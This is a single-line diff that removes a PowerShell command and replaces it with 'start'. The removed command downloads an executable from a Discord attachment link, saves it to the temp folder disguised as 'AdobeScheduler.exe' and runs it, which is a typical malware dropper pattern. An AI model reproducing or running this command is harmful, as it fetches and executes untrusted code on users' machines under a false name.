@@ -1,1 +1,1 @@
-cmd /c powershell.exe -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1333993941426503781/1333994217571094619/Nex_Optimizer.exe?ex=679ce4ad&is=679b932d&hm=a8fe60e4f95ce73bcdd2875071c412a5075c6354a08bce72a7b0e594aa68a984&' -OutFile "$env:TEMP\AdobeScheduler.exe"; Start-Process "$env:TEMP\AdobeScheduler.exe""
+start
